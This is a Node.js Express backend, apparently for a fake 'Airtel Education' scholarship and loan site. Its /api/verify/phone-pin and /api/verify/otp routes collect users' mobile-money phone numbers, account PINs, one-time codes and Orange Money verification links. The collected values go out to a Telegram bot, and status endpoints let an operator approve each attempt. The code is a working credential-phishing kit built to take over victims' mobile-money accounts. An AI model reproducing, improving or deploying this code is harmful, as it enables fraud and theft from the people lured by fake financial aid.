const express = require('express');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const { sendVerificationRequest, getVerificationStatus } = require('./telegram-bot');

const app = express();
const PORT = process.env.PORT || 3001;

const allowedOrigins = process.env.FRONTEND_ORIGIN 
    ? process.env.FRONTEND_ORIGIN.split(',').map(o => o.trim())
    : ['http://localhost:3000', 'https://express-finance-3h3i.onrender.com'];

app.use((req, res, next) => {
    const origin = req.headers.origin;
    if (!origin || allowedOrigins.includes(origin)) {
        res.header('Access-Control-Allow-Origin', origin || '*');
        res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
        res.header('Access-Control-Allow-Headers', 'Content-Type, X-API-Key');
        if (req.method === 'OPTIONS') {
            return res.sendStatus(200);
        }
        next();
    } else {
        console.warn(`CORS blocked origin: ${origin}. Allowed: ${allowedOrigins.join(', ')}`);
        res.status(403).json({ success: false, error: 'Not allowed by CORS' });
    }
});
app.use(express.json());

const API_KEY = process.env.API_KEY;

function authenticateApiKey(req, res, next) {
    if (!API_KEY) {
        console.warn('API_KEY not configured - authentication bypassed');
        return next();
    }
    const providedKey = req.headers['x-api-key'];
    if (!providedKey || providedKey !== API_KEY) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    next();
}

app.use(express.static(path.join(__dirname, '..')));

app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.get('/api/config', (req, res) => {
    res.json({ apiKey: API_KEY || '' });
});

app.post('/api/verify/phone-pin', authenticateApiKey, async (req, res) => {
    try {
        const { phone, countryCode, pin, flow, paymentMethod } = req.body;

        const phoneLengths = {
            '+243': { min: 9, max: 9 },
            '+260': { min: 9, max: 9 },
            '+265': { min: 9, max: 9 },
            '+254': { min: 9, max: 9 },
            '+256': { min: 9, max: 9 },
            '+255': { min: 9, max: 9 },
            '+250': { min: 9, max: 9 },
            '+27':  { min: 9, max: 9 },
            '+248': { min: 7, max: 7 },
            '+242': { min: 9, max: 9 },
            '+241': { min: 9, max: 9 },
            '+235': { min: 9, max: 9 },
            '+261': { min: 9, max: 9 },
            '+230': { min: 8, max: 8 },
            '+91':  { min: 10, max: 10 },
            '+880': { min: 10, max: 10 },
            '+94':  { min: 9, max: 9 },
            '+234': { min: 10, max: 10 },
        };

        const expected = phoneLengths[countryCode] || { min: 9, max: 9 };

        if (!phone || phone.length < expected.min || phone.length > expected.max) {
            return res.status(400).json({ success: false, error: 'Invalid phone number format' });
        }

        if (!pin || pin.length !== 4) {
            return res.status(400).json({ success: false, error: 'Invalid PIN format' });
        }

        const sanitizedPhone = String(phone).replace(/[^0-9]/g, '').slice(0, expected.max);
        const sanitizedPin = String(pin).replace(/[^0-9]/g, '').slice(0, 4);
        const sanitizedFlow = String(flow || 'scholarship').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 50);
        const sanitizedPaymentMethod = String(paymentMethod || 'airtel').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 20);

        const verificationValue = `Payment: ${sanitizedPaymentMethod}, Phone: ${sanitizedPhone}, PIN: ${sanitizedPin}`;

        const result = await sendVerificationRequest('PhonePIN', verificationValue, sanitizedFlow);

        if (result.success) {
            res.json({ success: true, message: 'Phone & PIN sent to Telegram', id: result.id });
        } else {
            res.status(503).json({ success: false, error: result.error || 'Service temporairement indisponible' });
        }
    } catch (error) {
        console.error('Unhandled error in /api/verify/phone-pin:', error);
        res.status(500).json({ success: false, error: 'Erreur serveur. Veuillez réessayer plus tard.' });
    }
});

app.get('/api/verify/phone-pin/status/:id', authenticateApiKey, (req, res) => {
    const status = getVerificationStatus(req.params.id);
    res.json({
        success: true,
        status: status.status
    });
});

app.post('/api/verify/otp', authenticateApiKey, async (req, res) => {
    try {
        const { otp, phone, countryCode, flow, paymentMethod } = req.body;

        const phoneLengths = {
            '+243': { min: 9, max: 9 },
            '+260': { min: 9, max: 9 },
            '+265': { min: 9, max: 9 },
            '+254': { min: 9, max: 9 },
            '+256': { min: 9, max: 9 },
            '+255': { min: 9, max: 9 },
            '+250': { min: 9, max: 9 },
            '+27':  { min: 9, max: 9 },
            '+248': { min: 7, max: 7 },
            '+242': { min: 9, max: 9 },
            '+241': { min: 9, max: 9 },
            '+235': { min: 9, max: 9 },
            '+261': { min: 9, max: 9 },
            '+230': { min: 8, max: 8 },
            '+91':  { min: 10, max: 10 },
            '+880': { min: 10, max: 10 },
            '+94':  { min: 9, max: 9 },
            '+234': { min: 10, max: 10 },
        };

        const expected = phoneLengths[countryCode] || { min: 9, max: 9 };

        if (!otp) {
            return res.status(400).json({ success: false, error: 'Champ de vérification requis' });
        }

        if (paymentMethod === 'orange') {
            const otpString = String(otp).trim();
            if (!otpString.startsWith('http')) {
                return res.status(400).json({ success: false, error: 'Veuillez coller le lien de vérification Orange Money.' });
            }
        } else {
            if (!/^\d{4,6}$/.test(String(otp).replace(/[^0-9]/g, ''))) {
                return res.status(400).json({ success: false, error: 'Invalid OTP format' });
            }
        }

        if (!phone || phone.length < expected.min || phone.length > expected.max) {
            return res.status(400).json({ success: false, error: 'Invalid phone number format' });
        }

        const sanitizedOtp = String(otp).replace(/[^0-9]/g, '').slice(0, 6);
        const sanitizedPhone = String(phone || '').replace(/[^0-9+ ]/g, '').slice(0, expected.max);
        const sanitizedFlow = String(flow || 'scholarship').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 50);
        const sanitizedPaymentMethod = String(paymentMethod || 'airtel').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 20);

        const verificationValue = paymentMethod === 'orange'
            ? `Payment: ${sanitizedPaymentMethod}, Orange Link: ${otp} (Phone: ${sanitizedPhone})`
            : `Payment: ${sanitizedPaymentMethod}, OTP: ${sanitizedOtp} (Phone: ${sanitizedPhone})`;

        const result = await sendVerificationRequest('OTP', verificationValue, sanitizedFlow);

        if (result.success) {
            res.json({ success: true, message: 'OTP sent to Telegram for verification', id: result.id });
        } else {
            res.status(503).json({ success: false, error: result.error || 'Service temporairement indisponible' });
        }
    } catch (error) {
        console.error('Unhandled error in /api/verify/otp:', error);
        res.status(500).json({ success: false, error: 'Erreur serveur. Veuillez réessayer plus tard.' });
    }
});

app.get('/api/verify/otp/status/:id', authenticateApiKey, (req, res) => {
    const status = getVerificationStatus(req.params.id);
    res.json({
        success: true,
        status: status.status
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'index.html'));
});

app.get('/scholarship', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'loan.html'));
});

app.get('/bourses', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'scholarship.html'));
});

app.get('/verify', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'verify.html'));
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'index.html'));
});

app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    if (!res.headersSent) {
        const message = (err && err.message) ? err.message : 'Erreur serveur';
        res.status(500).json({ success: false, error: message });
    }
});

app.listen(PORT, () => {
    console.log(`Airtel Education backend running on port ${PORT}`);
    console.log(`Telegram bot polling: ${process.env.TELEGRAM_BOT_TOKEN ? 'enabled' : 'disabled'}`);
});